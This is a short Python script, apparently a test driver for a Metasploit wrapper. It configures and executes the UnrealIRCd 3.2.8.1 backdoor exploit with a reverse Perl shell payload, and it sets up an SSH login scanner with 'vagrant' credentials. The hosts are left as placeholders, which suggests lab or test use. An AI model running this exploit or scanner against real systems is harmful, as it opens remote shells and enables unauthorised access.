from mod import execute, validate

args_with_payload = {
    "module_type": "exploit",
    "module": "unix/irc/unreal_ircd_3281_backdoor",
    "module_timeout": 20,
    "module_retries": 3,
    "module_options":
        {
            "RHOSTS": "CHANGE_ME",
            "RPORT": "6697"
        },
    "payload": "cmd/unix/reverse_perl",
    "payload_options":
        {
            "LHOST": "CHANGE_ME",
            "LPORT": "4444"
        }

}

args_without_payload = {
    "module_type": "auxiliary",
    "module": "scanner/ssh/ssh_login",
    "module_options":
        {
            "RHOSTS": "CHANGE_ME",
            "USERNAME": "vagrant",
            "PASSWORD": "vagrant"
        },
}


val_output = validate(args_with_payload)
print(f"validate output: {str(val_output)}")

ex_output = execute(args_with_payload)
print(f"execute output: {str(ex_output)}")

